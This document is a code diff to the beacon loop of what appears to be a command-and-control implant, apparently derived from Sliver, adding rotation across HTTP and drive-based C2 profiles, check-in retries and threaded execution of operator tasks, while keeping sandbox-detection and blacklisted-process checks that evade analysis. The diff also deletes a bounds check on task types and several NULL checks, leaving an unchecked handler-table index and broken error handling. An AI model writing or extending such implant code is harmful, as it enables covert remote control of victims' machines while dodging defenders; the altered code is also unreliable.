@@ -277,10 +277,6 @@ PENVELOPE* BeaconHandleTaskList
 	HandlerTable = GetSystemHandler();
 
 	for (i = 0; i < dwNumberOfTasks; i++) {
-		if (Tasks[i]->uType >= MsgEnd) {
-			goto UNKNOWN_TYPE;
-		}
-
 		ReqHandler = HandlerTable[Tasks[i]->uType];
 		if (ReqHandler != NULL) {
 			pResult[i] = ReqHandler(Tasks[i], pBeacon);
@@ -351,38 +347,23 @@ VOID BeaconWork
 
 	pBeacon = pWrapper->pBeacon;
 	TaskResults = BeaconHandleTaskList(pWrapper->pTaskList, pWrapper->dwNumberOfTasks, pBeacon);
-	if (TaskResults == NULL) {
-		goto CLEANUP;
-	}
-
 	dwOldInterval = pBeacon->dwInterval;
 	pSendEnvelope = MarshalBeaconTasks(pBeacon, 0, TaskResults, pWrapper->dwNumberOfTasks);
-	if (!pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pSendEnvelope)) {
-		goto CLEANUP;
-	}
-
+	pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pSendEnvelope);
 CLEANUP:
 	FreeEnvelope(pSendEnvelope);
-	if (TaskResults != NULL) {
-		for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
-			FreeEnvelope(TaskResults[i]);
-		}
-
-		FREE(TaskResults);
+	for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
+		FreeEnvelope(TaskResults[i]);
+		FreeEnvelope(pWrapper->pTaskList[i]);
 	}
 
-	if (pWrapper != NULL) {
-		for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
-			FreeEnvelope(pWrapper->pTaskList[i]);
-		}
-
-		FREE(pWrapper);
-	}
-	
+	FREE(TaskResults);
+	FREE(pWrapper->pTaskList);
 	if (dwOldInterval != pBeacon->dwInterval) {
 		SetEvent(pWrapper->hEvent);
 	}
 
+	FREE(pWrapper);
 	return;
 }
 
@@ -400,83 +381,94 @@ VOID BeaconMainLoop
 	DWORD dwNumberOfAttempts = 0;
 	PBEACON_TASKS_WRAPPER pWrapper = NULL;
 	HANDLE hEvent = NULL;
+	PGLOBAL_CONFIG pConfig = pBeacon->pGlobalConfig;
+	LPVOID* ProfileList = NULL;
+	DWORD cProfiles = 0;
 
-	hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
-	pBeacon->lpClient = pBeacon->Init(pBeacon->pGlobalConfig);
-	if (pBeacon->lpClient == NULL) {
-		goto CLEANUP;
-	}
-
-#ifndef _DEBUG
-	if (DetectSandbox2() || DetectSandbox3()) {
-		goto CLEANUP;
-	}
-#endif
-	if (!pBeacon->Start(pBeacon->pGlobalConfig, pBeacon->lpClient)) {
-		goto CLEANUP;
-	}
-
-	if (!BeaconRegister(pBeacon)) {
-		goto CLEANUP;
-	}
-
+	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
 	pSliverPool = InitializeSliverThreadPool();
 	if (pSliverPool == NULL) {
 		goto CLEANUP;
 	}
 
-	while (TRUE) {
+	if (pConfig->Protocol == Http) {
+		ProfileList = pConfig->HttpProfiles;
+		cProfiles = pConfig->cHttpProfiles;
+	}
+	else if (pConfig->Protocol == Drive) {
+		ProfileList = pConfig->DriveProfiles;
+		cProfiles = pConfig->cDriveProfiles;
+	}
+	else {
+		goto CLEANUP;
+	}
+
+	for (i = 0; i < cProfiles; i++) {
+		pBeacon->lpClient = pBeacon->Init(ProfileList[i]);
 #ifndef _DEBUG
-		if (DetectSandbox1() || DetectSandbox2() || CheckForBlackListProcess()) {
+		if (DetectSandbox2() || DetectSandbox3()) {
 			goto CLEANUP;
 		}
 #endif
 
-		if (dwNumberOfAttempts >= pBeacon->pGlobalConfig->dwMaxFailure) {
-			break;
+		if (!pBeacon->Start(pConfig, pBeacon->lpClient)) {
+			goto CONTINUE;
 		}
 
-		pNextCheckinEnvelope = MarshalBeaconTasks(pBeacon, GetNextCheckin(pBeacon), NULL, 0);
-		if (!pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pNextCheckinEnvelope)) {
-			pNextCheckinEnvelope++;
-			continue;
+		if (!BeaconRegister(pBeacon)) {
+			goto CONTINUE;
 		}
 
-		FreeEnvelope(pNextCheckinEnvelope);
-		pRecvEnvelope = pBeacon->Receive(pBeacon->pGlobalConfig, pBeacon->lpClient);
-		if (pRecvEnvelope != NULL && pRecvEnvelope->pData != NULL) {
-			BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);
-			FreeEnvelope(pRecvEnvelope);
+		dwNumberOfAttempts = 0;
+		while (TRUE) {
+#ifndef _DEBUG
+			if (DetectSandbox1() || DetectSandbox2() || CheckForBlackListProcess()) {
+				goto CLEANUP;
+			}
+#endif
 
-			pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
-			pWrapper->pTaskList = BeaconTask->EnvelopeList;
-			pWrapper->dwNumberOfTasks = BeaconTask->dwNumberOfEnvelopes;
-			pWrapper->hEvent = hEvent;
-			pWrapper->pBeacon = pBeacon;
+			if (dwNumberOfAttempts >= pConfig->dwMaxFailure) {
+				goto CONTINUE;
+			}
 
-			if (BeaconTask->lpInstanceID != NULL) {
+			pNextCheckinEnvelope = MarshalBeaconTasks(pBeacon, GetNextCheckin(pBeacon), NULL, 0);
+			if (!pBeacon->Send(pConfig, pBeacon->lpClient, pNextCheckinEnvelope)) {
+				FreeEnvelope(pNextCheckinEnvelope);
+				dwNumberOfAttempts++;
+				goto SLEEP;
+			}
+
+			dwNumberOfAttempts = 0;
+			FreeEnvelope(pNextCheckinEnvelope);
+			pRecvEnvelope = pBeacon->Receive(pConfig, pBeacon->lpClient);
+			if (pRecvEnvelope != NULL && pRecvEnvelope->pData != NULL) {
+				BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);
+
+				pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
+				pWrapper->pTaskList = BeaconTask->EnvelopeList;
+				pWrapper->dwNumberOfTasks = BeaconTask->dwNumberOfEnvelopes;
+				pWrapper->hEvent = hEvent;
+				pWrapper->pBeacon = pBeacon;
+
 				FREE(BeaconTask->lpInstanceID);
-				BeaconTask->lpInstanceID = NULL;
+				FREE(BeaconTask);
+				pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
+				TpPostWork(pWork);
 			}
 
-			FREE(BeaconTask);
-			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
-			if (pWork == NULL) {
-				LOG_ERROR("CreateThreadpoolWork", GetLastError());
-				continue;
-			}
-
-			TpPostWork(pWork);
+			FreeEnvelope(pRecvEnvelope);
+SLEEP:
+			WaitForSingleObject(hEvent, GetNextCheckin(pBeacon) * 1000);
 		}
 
-		WaitForSingleObject(hEvent, GetNextCheckin(pBeacon) * 1000);
+CONTINUE:
+		pBeacon->Close(pBeacon->lpClient);
+		pBeacon->Cleanup(pBeacon->lpClient);
+		pBeacon->lpClient = NULL;
 	}
 
 CLEANUP:
 	FreeSliverThreadPool(pSliverPool);
-	FreeBeaconTask(BeaconTask);
-	FreeEnvelope(pNextCheckinEnvelope);
-
 	if (hEvent != NULL) {
 		CloseHandle(hEvent);
 	}
